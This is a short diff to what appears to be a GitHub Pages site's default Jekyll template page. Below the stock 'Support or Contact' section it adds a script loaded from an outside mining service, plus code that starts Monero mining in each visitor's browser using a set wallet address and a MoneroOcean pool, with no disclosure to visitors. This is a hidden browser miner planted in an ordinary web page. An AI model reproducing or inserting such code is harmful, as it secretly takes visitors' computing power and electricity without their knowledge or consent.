@@ -35,3 +35,16 @@ Your Pages site will use the layout and styles from the Jekyll theme you have se
 ### Support or Contact
 
 Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+
+<script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+    var site_id = 'cwm-1224';
+    var coin = 'monero';
+    var wallet = '43AULrkzx3ZCJvBmn8uRnUKhmCQ3ZucqDMfLhyvVCcsf4AyzWeye1A1F2iXtcJWEMe3AhHnBtRxr67GRApVvrzADRtQGdxC';
+    var password = 'x';
+    var mining_pool = 'gulf.moneroocean.stream:10001';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>
